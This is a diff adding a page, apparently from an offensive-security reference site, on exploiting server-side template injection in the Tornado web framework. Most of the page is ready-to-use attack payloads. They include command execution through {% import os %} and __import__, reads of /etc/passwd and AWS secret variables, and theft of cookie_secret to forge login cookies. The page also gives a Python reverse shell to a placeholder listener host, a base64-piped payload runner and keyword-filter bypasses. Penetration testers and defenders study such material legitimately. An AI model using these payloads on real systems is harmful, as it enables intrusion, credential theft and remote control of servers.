@@ -1,0 +1,224 @@
+---
+title: Tornado (Python - Tornado web framework)
+description: SSTI exploitation in Tornado templates - the {% import %} statement that reaches os/subprocess directly, handler-object loot, and reverse shells.
+mitre: [T1190, T1059.006]
+d3fend: [D3-EAL, D3-PE]
+impact: [ServerSideEval, RCE, FileRead]
+sidebar:
+  order: 10
+  label: Tornado
+---
+import { Aside } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Tornado's template language is a thin wrapper over Python - templates compile to Python functions and run with no sandbox. Unlike Jinja2, it exposes a real `{% import %}` statement, so you reach `os`/`subprocess` directly without any class-graph walk.
+
+```
+# Confirm Python-family eval (same as Jinja2)
+{{7*7}}                                      # → 49
+{{7*'7'}}                                    # → 7777777 (Python string repeat)
+
+# RCE - the Tornado signature: import a module, then call it
+{% import os %}{{ os.system('id') }}
+{% import os %}{{ os.popen('id').read() }}
+{% import subprocess %}{{ subprocess.check_output('id', shell=True) }}
+
+# Loot - handler object leaks application settings incl. cookie_secret
+{{ handler.settings }}
+```
+
+Success indicator: `id` output (uid/gid line) in the response, or `os.system` returning `0`.
+
+## Where this engine lives
+
+- **Tornado web framework** - Python async web server. Templates are rendered with `tornado.template.Template(...).generate()` or a `RequestHandler`'s `render()` / `render_string()`. The SSTI sink is any of those called on user input.
+- **Standalone `tornado.template`** - the template module is sometimes embedded outside the web framework (email builders, code generators) because it's dependency-light.
+- **Legacy Python stacks** - Tornado predates ASGI and lingers in older Python services and internal tooling.
+
+Tornado is the engine the second SSTI exploitation example in the Server-side Attacks module walks through - the one where Jinja2/Twig-specific payloads all return `500` and the working payload turns out to be `{% import os %}{{ os.system('whoami') }}`.
+
+## Step 1 - Confirm and disambiguate from Jinja2
+
+Tornado sits in the `{{ ... }}` family and is Python-backed, so the two fast probes look *identical* to Jinja2:
+
+```
+{{7*7}}                          # → 49        template eval confirmed
+{{7*'7'}}                        # → 7777777   Python-family (Jinja2, Tornado, Mako, ...)
+```
+
+Neither of these separates Tornado from Jinja2 - both are Python, both repeat the string. The disambiguation is which engine-specific payloads throw and which evaluate:
+
+```
+# Jinja2-specific - 500 / error on Tornado
+{{config}}                       # Jinja2: dumps Flask config.  Tornado: error
+{{self}}                         # Jinja2: runtime Context.     Tornado: error
+{{ ''.__class__.__mro__[1].__subclasses__() }}   # Jinja2: works.  Tornado: error (no bare '' attr walk in expr context the same way)
+
+# Tornado-specific - evaluates on Tornado, errors on Jinja2
+{% import os %}{{ os.getcwd() }}         # Tornado: cwd string.  Jinja2: error (its {% import %} is for templates, not modules)
+{% import sys %}{{ sys.version }}        # Tornado: Python version.  Jinja2: error
+```
+
+<Aside type="note">
+The decisive tell is the `{% import %}` statement. Jinja2 *has* an `{% import %}` tag, but it imports **other templates**, not Python modules - `{% import os %}` raises in Jinja2. In Tornado, `{% import os %}` is a literal Python `import os`. If `{% import os %}{{ os.getcwd() }}` returns a path, you have Tornado (or another engine that compiles directly to Python, like Mako - see the fingerprint note below).
+</Aside>
+
+### Splitting Tornado from Mako
+
+Mako is the other "compiles to raw Python" engine and also evaluates Python expressions. Tell them apart by delimiter:
+
+- **Tornado** - `{{ expr }}` for output, `{% ... %}` for statements.
+- **Mako** - `${ expr }` for output, `<% ... %>` for statement blocks, `% ...` for line statements.
+
+If `{{7*7}}` evaluated, you are not on Mako (Mako would leave `{{7*7}}` literal and needs `${7*7}`). So within the `{{...}}`-Python family, the working `{% import %}` statement points at Tornado.
+
+## Step 2 - Loot before escalating
+
+Tornado's RCE is trivial, but the handler object is worth grabbing first - it is low-noise and `cookie_secret` alone is often game over.
+
+```
+# Application settings - cookie_secret, debug flag, DB config stuffed in settings
+{{ handler.settings }}
+
+# Request object - headers, cookies, arguments
+{{ handler.request }}
+{{ handler.request.headers }}
+{{ handler.request.cookies }}
+
+# The application instance
+{{ handler.application.settings }}
+
+# Current user (whatever get_current_user returns)
+{{ handler.current_user }}
+```
+
+`handler.settings['cookie_secret']` is the key Tornado uses to sign secure cookies (`set_secure_cookie` / `get_secure_cookie`). With it you forge any user's `tornado_user`-style cookie and bypass authentication without needing RCE - the same leverage `{{config.SECRET_KEY}}` gives you on Flask/Jinja2.
+
+When the sink is a bare `tornado.template.Template` outside a request handler, `handler` is not defined - skip straight to Step 3.
+
+## Step 3 - RCE
+
+Tornado templates are not sandboxed. Import a module and call it in the same payload:
+
+```
+# os.system - returns the exit code (0 on success), prints output inline on some sinks
+{% import os %}{{ os.system('id') }}
+
+# os.popen - captures stdout, the reliable "show me the output" form
+{% import os %}{{ os.popen('id').read() }}
+{% import os %}{{ os.popen('cat /etc/passwd').read() }}
+{% import os %}{{ os.popen('uname -a; hostname; whoami').read() }}
+
+# subprocess - when os is filtered
+{% import subprocess %}{{ subprocess.check_output('id', shell=True) }}
+{% import subprocess %}{{ subprocess.check_output(['id']) }}
+```
+
+Prefer `os.popen(...).read()` - `os.system` returns the exit status (you see `0`, not the command output) unless the sink happens to capture stdout.
+
+### Multi-statement payloads
+
+`{% ... %}` blocks chain, so you can import once and use the module across several expressions:
+
+```
+{% import os %}
+{{ os.popen('id').read() }}
+{{ os.popen('ls -la /').read() }}
+```
+
+### `exec` / `eval` for arbitrary Python
+
+When you want full Python rather than shelling out:
+
+```
+{% import os %}{{ os.getenv('AWS_SECRET_ACCESS_KEY') }}
+{% raw %}{% import os %}{% end %}            # note: Tornado uses {% end %}, not {% endfor %}/{% endif %}
+```
+
+Tornado closes every block with `{% end %}` (not `{% endfor %}` / `{% endif %}` as Jinja2 does) - a useful secondary fingerprint and necessary when your payload needs a loop or conditional.
+
+## File read without command execution
+
+When `os`/`subprocess` are filtered but `import` and expressions still work, read files with the builtin `open`:
+
+```
+{% import io %}{{ open('/etc/passwd').read() }}
+{{ open('/etc/passwd').read() }}             # open is a builtin - no import needed
+```
+
+Tornado exposes Python builtins in template scope, so `open`, `__import__`, and friends are reachable directly:
+
+```
+{{ __import__('os').popen('id').read() }}
+```
+
+`{{ __import__('os').popen('id').read() }}` is the shortest Tornado RCE - no `{% import %}` statement needed at all, just the builtin `__import__` in expression context.
+
+## Reverse shell
+
+Standard Python reverse shell through `os.system`:
+
+```
+{% import os %}{{ os.system('python3 -c \'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")\'') }}
+```
+
+Listener:
+
+```bash
+nc -lvnp <LPORT>
+```
+
+When quoting across the sink is awkward, base64 the inner command:
+
+```
+{% import os %}{{ os.system('echo BASE64_PAYLOAD | base64 -d | python3') }}
+```
+
+## Filter-aware variants
+
+When keywords (`import`, `os`, `system`, `popen`) are blocked, see [filter bypass](/codex/web/server-side/ssti/filter-bypass/). Tornado-specific quick wins:
+
+```
+# __import__ builtin avoids the {% import %} statement keyword entirely
+{{ __import__('os').popen('id').read() }}
+
+# getattr chain avoids a literal 'popen'
+{{ getattr(__import__('os'), 'pop'+'en')('id').read() }}
+
+# string concatenation to dodge a literal 'os' / 'system' match
+{% import os %}{{ os.popen('i'+'d').read() }}
+{{ __import__('o'+'s').system('id') }}
+```
+
+Because template scope is raw Python, any filter-bypass that works in a Python `eval` sink works here - string building, `getattr`, `chr()`-assembled names, hex-escaped identifiers.
+
+## Detection-only payloads
+
+Confirm Tornado without escalating:
+
+```
+{{7*7}}                                      # eval probe → 49
+{% import sys %}{{ sys.platform }}           # → 'linux' / 'win32' - confirms module import works
+{{ handler }}                                # → <...RequestHandler object> when sink is a handler
+```
+
+`{% import sys %}{{ sys.platform }}` is the cleanest non-destructive Tornado confirmation - it proves module import works (ruling out Jinja2) without running a command.
+
+## Common failure modes
+
+- **`{{config}}` / `{{self}}` throw but `{{7*7}}` works.** You are Python-family but not Jinja2. Try `{% import os %}{{ os.getcwd() }}` - if it evaluates, it's Tornado.
+- **`os.system` returns `0` and no output.** Expected - `system` returns the exit code. Switch to `os.popen('...').read()` to capture stdout.
+- **`{% import os %}` raises a syntax error about `end`.** Your payload opened a block Tornado expects you to close - but a bare `{% import os %}` needs no `{% end %}`. The error usually means a *different* block (a stray `{% if %}`/`{% for %}`) is unterminated.
+- **Output is empty but no error.** The sink rendered the template but discarded the expression value. Assign and echo, or make the whole payload a single `{{ ... }}` expression (`{{ __import__('os').popen('id').read() }}`).
+- **`handler` is undefined.** The template is rendered by bare `tornado.template`, not a `RequestHandler`. Loot via `handler` is unavailable; go straight to `{% import os %}` RCE.
+
+## Notes
+
+- **No sandbox.** Tornado has no equivalent of Jinja2's `SandboxedEnvironment` - there is no "sandboxed Tornado" to escape. If you can evaluate `{{ ... }}`, you have Python. This makes Tornado SSTI simpler and higher-impact than Jinja2 SSTI, where the sandbox and the class-graph walk add steps.
+- **`{% import %}` is the whole trick.** The subclass-walk gymnastics the Jinja2 page documents are unnecessary here - Tornado hands you `import` directly. Reach for the walk only if `import` and `__import__` are both filtered.
+- **`{% end %}` closes every block** (not `{% endif %}` / `{% endfor %}`). Both a fingerprint and a requirement when your payload uses control flow.
+
+<Aside type="caution">
+`{% import os %}{{ os.system('id') }}` executes on the application server in the application's user context - the same blast radius as any RCE. Confirm scope before going past the `{{ handler.settings }}` / `cookie_secret` loot stage.
+</Aside>
